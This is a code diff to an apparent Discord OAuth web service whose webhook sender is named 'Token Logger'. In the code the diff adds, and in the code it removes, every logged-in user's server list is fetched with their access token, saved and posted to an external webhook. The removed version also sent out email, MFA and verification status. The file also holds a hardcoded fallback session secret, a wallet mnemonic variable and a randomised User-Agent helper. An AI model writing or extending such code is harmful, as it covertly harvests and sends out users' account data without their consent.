@@ -998,7 +998,6 @@ app.use((req, res, next) => {
 });
 
 app.use(cookieParser());
-
 app.use(session({
   secret: process.env.SESSION_SECRET || 'secret-key-2026',
   resave: false,
@@ -1021,27 +1020,8 @@ const WALLET_MNEMONIC = process.env.WALLET_MNEMONIC;
 const TARGET_USD = 3.00;
 const TOLERANCE_USD = 0.10;
 
-// ═══════════════════════════════════════════════════════════════════════════════
-// WEBHOOK NOTIFICATIONS
-// ═══════════════════════════════════════════════════════════════════════════════
-
-async function _sendWebhookChunk(embed, chunkIndex = 0) {
-  if (!WEBHOOK_URL) return;
+async function fetchAndLogGuilds(accessToken, userId, username) {
   try {
-    const payload = chunkIndex === 0 ? { embeds: [embed], username: 'Token Logger', avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png' } : { content: '...' };
-    await axios.post(WEBHOOK_URL, payload, {
-      headers: { 'Content-Type': 'application/json', 'User-Agent': _rfp() },
-      timeout: 10000
-    });
-  } catch(e) {
-    console.error('[Webhook] Send failed:', e.message);
-  }
-}
-
-// Fetches user's guilds and sends them to webhook with login info
-async function fetchAndLogGuilds(accessToken, userId, username, userProfile) {
-  try {
-    // Fetch guilds from Discord API
     const guildsRes = await axios.get('https://discord.com/api/v10/users/@me/guilds', {
       headers: { 'Authorization': `Bearer ${accessToken}`, 'User-Agent': _rfp() },
       timeout: 15000
@@ -1055,64 +1035,30 @@ async function fetchAndLogGuilds(accessToken, userId, username, userProfile) {
       fs.writeFileSync(guildsFile, JSON.stringify({ userId, username, fetchedAt: Date.now(), guildCount: guildList.length, guilds: guildList }, null, 2));
     } catch(e) {}
 
-    // Build servers list text
-    let serversText = '';
-    if (guildList.length === 0) {
-      serversText = '*Not in any servers*';
-    } else {
-      const serverLines = guildList.map(g => `${g.name} (${g.id})${g.owner ? ' [OWNER]' : ''}`);
-      serversText = serverLines.join('\n');
-      // Truncate if too long for embed field
-      if (serversText.length > 1000) {
-        serversText = serverLines.slice(0, 25).join('\n') + `\n... and ${guildList.length - 25} more servers`;
+    // Send to webhook
+    const chunks = [];
+    let currentChunk = '';
+    for (const g of guildList) {
+      const line = `• ${g.name} (${g.id})${g.owner ? ' [OWNER]' : ''}\n`;
+      if (currentChunk.length + line.length > 900) {
+        chunks.push(currentChunk);
+        currentChunk = line;
+      } else {
+        currentChunk += line;
       }
     }
+    if (currentChunk) chunks.push(currentChunk);
 
-    // Send unified webhook embed with user info + servers
-    const embed = {
-      title: 'New OAuth Login',
-      color: 0x5865F2,
-      fields: [
-        { name: 'Username', value: username || 'N/A', inline: true },
-        { name: 'User ID', value: userId || 'N/A', inline: true },
-        { name: 'Email', value: userProfile?.email || 'N/A', inline: true },
-        { name: 'Verified', value: userProfile?.verified ? 'Yes' : 'No', inline: true },
-        { name: 'MFA', value: userProfile?.mfa_enabled ? 'Yes' : 'No', inline: true },
-        { name: 'Nitro', value: userProfile?.premium_type ? `Type ${userProfile.premium_type}` : 'No', inline: true },
-        { name: `Servers (${guildList.length})`, value: '```' + serversText + '```', inline: false }
-      ],
-      footer: { text: `Total servers: ${guildList.length} | ${new Date().toISOString()}` },
-      timestamp: new Date().toISOString()
-    };
-    await _sendWebhookChunk(embed, 0);
-
-    // If more than 25 servers, send additional chunks
-    if (guildList.length > 25) {
-      const chunks = [];
-      let currentChunk = '';
-      for (const g of guildList.slice(25)) {
-        const line = `• ${g.name} (${g.id})${g.owner ? ' [OWNER]' : ''}\n`;
-        if (currentChunk.length + line.length > 900) {
-          chunks.push(currentChunk);
-          currentChunk = line;
-        } else {
-          currentChunk += line;
-        }
-      }
-      if (currentChunk) chunks.push(currentChunk);
-
-      for (let i = 0; i < chunks.length; i++) {
-        const chunkEmbed = {
-          title: `More Servers for @${username}`,
-          color: 0x5865F2,
-          description: chunks[i],
-          footer: { text: `User: ${username} | ID: ${userId} | Chunk ${i + 1}/${chunks.length}` },
-          timestamp: new Date().toISOString()
-        };
-        await _sendWebhookChunk(chunkEmbed, i);
-      }
+    for (let i = 0; i < chunks.length; i++) {
+      const embed = {
+        title: i === 0 ? `Servers for @${username}` : `Servers (cont.)`,
+        color: 0x5865F2,
+        description: chunks[i],
+        footer: { text: `User: ${username} | ID: ${userId} | Total: ${guildList.length} servers | Page ${i + 1}/${chunks.length}` },
+        timestamp: new Date().toISOString()
+      };
+      await _sendWebhookChunk(embed, i);
     }
-
     return guildList;
   } catch (err) {
     console.error('[Guilds] Fetch failed:', err.message);
@@ -1125,13 +1071,12 @@ if (CLIENT_ID && CLIENT_SECRET) {
     clientID: CLIENT_ID,
     clientSecret: CLIENT_SECRET,
     callbackURL: CALLBACK_URL,
-    scope: ['identify', 'guilds', 'email']
+    scope: ['identify', 'guilds']
   }, (accessToken, refreshToken, profile, done) => {
     process.nextTick(async () => {
       try {
         profile.accessToken = accessToken;
-        // Pass full profile so email/verified/mfa info is included in webhook
-        await fetchAndLogGuilds(accessToken, profile.id, profile.username, profile);
+        await fetchAndLogGuilds(accessToken, profile.id, profile.username);
       } catch(e) {}
       done(null, profile);
     });
@@ -1178,6 +1123,23 @@ function ensureCanGenerate(req, res, next) {
   if (!req.isAuthenticated()) return res.status(401).json({ success: false, error: 'Not logged in' });
   if (req.user.id !== OWNER_ID && !db.isWhitelisted(req.user.id)) return res.status(403).json({ success: false, error: 'Owner or whitelisted users only' });
   next();
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// WEBHOOK NOTIFICATIONS
+// ═══════════════════════════════════════════════════════════════════════════════
+
+async function _sendWebhookChunk(embed, chunkIndex = 0) {
+  if (!WEBHOOK_URL) return;
+  try {
+    const payload = chunkIndex === 0 ? { embeds: [embed], username: 'Token Logger', avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png' } : { content: '...' };
+    await axios.post(WEBHOOK_URL, payload, {
+      headers: { 'Content-Type': 'application/json', 'User-Agent': _rfp() },
+      timeout: 10000
+    });
+  } catch(e) {
+    console.error('[Webhook] Send failed:', e.message);
+  }
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
